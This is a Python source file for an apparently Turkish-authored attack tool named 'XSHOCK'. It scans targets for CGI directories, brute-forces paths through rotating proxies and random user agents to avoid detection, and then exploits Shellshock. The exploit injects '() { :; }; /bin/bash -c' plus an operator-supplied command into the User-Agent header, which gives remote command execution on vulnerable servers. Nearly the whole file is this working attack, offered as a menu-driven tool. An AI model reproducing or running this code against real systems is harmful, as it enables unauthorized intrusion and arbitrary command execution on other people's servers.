import requests
import os
import sys
import random
import loginscreen
from time import sleep

class Colors:
    r = '\033[31m'
    g = '\033[32m'
    y = '\033[33m'
    b = '\033[34m'
    m = '\033[35m'
    c = '\033[36m'
    w = '\033[37m'


def get_proxies():
    try:
        lines = [line.rstrip("\n") for line in open("proxy.txt")]
    except IOError as e:
        print("Proxy file error: %s" % e.strerror)
        sys.exit(1)
    return lines


def get_user_agent():
    try:
        lines = [line.rstrip("\n") for line in open("useragent.txt")]
    except IOError as e:
        print("User Agent error: %s" % e.strerror)
        sys.exit(1)
    return lines


def cgiBul():
    try:
        print(Colors.y + "e.g ==>http://target.com\n(Dont add / symbol at the end of the url!)")
        url = input("TARGET URL\t:")
        bb = url + "/cgi-bin/"
        c = requests.get(bb)
        istek = c.status_code
        print(istek)
        if (istek == 200) or (istek == 403) or (istek == 301) or (istek == 302):
            print(Colors.y + "Status Code\t:" + str(istek))
            print(Colors.y + "Vuln Url\t:" + bb)

        else:
            print(Colors.r, "Not Vuln..!!!")

    except:
        print(Colors.r, "Invalid URL Try AGAIN..!")
        sleep(3)
        cgiBul()
    sleep(2)


def dizinScan():
    counter = 0
    try:
        print(Colors.y + "e.g ==> http://target.com/cgi-bin\n (Dont add / symbol at the end of the url!)")
        bb = input("Enter target\t:")
        anadizin = os.getcwd()
        print(Colors.y + "e.g==> /usr/share/wordlists/dirb\t")
        os.chdir(input(Colors.r + "Please Enter Wordlist Path:\t"))
        dizinn = os.getcwd()
        print(Colors.g + "Selected Directory Path\t:" + dizinn)
        gecici = dict()
        sayac = 0
        for i in os.listdir():
            if os.path.isfile(i):
                sayac += 1
                print(Colors.y, sayac, i)
                gecici[sayac] = "{}/{}".format(os.getcwd(), i)
            else:
                pass
        secim = input("Secim gir:")
        tt = gecici[int(secim)]
        print(Colors.r + "Selected File\t:" + tt)
        while True:

            with open(tt, "r", errors='ignore', encoding="utf-8") as f:
                for i in f:
                    try:
                        url = bb + "/{}/".format(i).replace("\n", "")
                        os.chdir(anadizin)
                        usrr = get_user_agent()
                        proy = get_proxies()
                        proxy = {'https': 'http://{}'.format(random.choice(proy))}
                        headers_param = {"User-Agent": "{}".format(random.choice(usrr))}
                        istek = requests.get(url, headers=headers_param, proxies=proxy)
                        if (istek.status_code == 200) or (istek == 301) or (istek == 302):
                            print(Colors.y, "Status Code\t:" + str(istek.status_code))
                            print("[+]-----> Find Vuln Url\t: " + url)
                            with open("vulnurl.txt", "a") as f:
                                f.write(url + "\n")
                            counter += 1

                        else:
                            print(Colors.b, "Scanning for\t:" + url)
                    except:
                        pass
            break


    except:
        print("CHECK YOUR TARGET..!")
        sleep(3)
        pass
    print("\n{} vulnerable url(s) found.Please check vulnurl.txt".format(counter))
    sleep(2)
    counter = 0
def commandIn():
    try:
        while True:
            aaa = input(Colors.b +"Vulnerable url enter\t\t:")
            while True:
                print(Colors.w + "[+]-----> Press '1' to enter new url..!")
                print(Colors.w + "[+]-----> Press 'q' to exit..!")
                command = input(Colors.r + "[+]-----> Please enter the command you want to run\t\t:")
                if (command == "q"):
                    print("Exiting...")
                    sys.exit()
                elif (command == "1"):
                    commandIn()
                else:
                    headers = {"User-Agent": "() { :; }; /bin/bash -c 'ping -c 3 google.com;" + command +"'"}
                    req = requests.get(aaa, headers=headers)
                    
                    with open("response.txt","a",encoding="utf-8") as f:
                        f.writelines("\n\n========================================================\nBEGIN | URL:{}\n\n".format(aaa))
                        f.writelines(req.text)
                        f.writelines("\nEND | URL: {}\n========================================================\n".format(aaa))
                    
                    print("Yazdırıldı")
                    with open("response.txt","r", encoding="utf-8") as f:
                        for i in f:
                            print(i.replace("\n",""))

    except Exception as err:
       print(err)
       sleep(5)
       commandIn()




loginscreen.entry()


def Menu():
    import proxy
    print(Colors.m, "\n\n|~~|~~|~~|         WELCOME TO XSHOCK            |~~|~~|~~|  ")
    y = """
1) CGI VULN SCAN
2) DIRECTORY SCAN
3) RUN COMMAND WITH FOUNDED CGI
4) SHOW VULNERABLE URLS
5) UPDATE PROXY
6) EXIT

Please update proxies from 5 first...

    """
    for c in y:
        print(Colors.b + c, end='')
        sys.stdout.flush()
        sleep(0.0015)

    try:
        while True:
            secim = input(Colors.m + "\tPLEASE SELECT ENTRY\t:")
            if secim == "1":
                cgiBul()
            elif secim == "2":
                dizinScan()
            elif secim == "3":
                commandIn()
            elif secim == "4":
                with open("vulnurl.txt", "r") as f:
                    print(f.read())
            elif secim == "5":
                import proxy
            elif secim == "6":
                print("Exiting...")
                sleep(1)
                sys.exit(0)

            else:
                print("Try again")
            Menu()
    except Exception as err:
        print(err)
        pass


Menu()